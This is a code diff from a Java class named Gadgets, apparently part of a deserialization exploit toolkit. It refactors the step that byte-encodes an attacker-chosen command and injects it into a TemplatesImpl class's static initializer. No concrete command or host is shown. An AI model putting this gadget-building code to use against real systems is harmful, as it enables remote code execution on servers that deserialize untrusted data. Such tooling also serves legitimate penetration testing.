@@ -191,17 +191,7 @@ public class Gadgets {
                         }
                     }
                     if(""!=cmd){
-                        byte[] byteArray = cmd.getBytes();
-                        StringBuilder sb = new StringBuilder();
-                        sb.append("new String(new byte[]{");
-                        for (int i = 0; i < byteArray.length; i++) {
-                            sb.append(byteArray[i]);
-                            if (i != byteArray.length - 1) {
-                                sb.append(", ");
-                            }
-                        }
-                        sb.append("});");
-                        String cmd1 = "cmd = "+sb.toString();
+                        String cmd1 = getString(cmd);
                         ctClass.makeClassInitializer().insertBefore(cmd1);
                     }
                 }
@@ -233,6 +223,21 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
+    }
+
+    private static String getString(String cmd) {
+        byte[] byteArray = cmd.getBytes();
+        StringBuilder sb = new StringBuilder();
+        sb.append("new String(new byte[]{");
+        for (int i = 0; i < byteArray.length; i++) {
+            sb.append(byteArray[i]);
+            if (i != byteArray.length - 1) {
+                sb.append(", ");
+            }
+        }
+        sb.append("});");
+        String cmd1 = "cmd = "+sb.toString();
+        return cmd1;
     }
 
     public static HashMap makeMap(Object v1, Object v2) throws Exception {
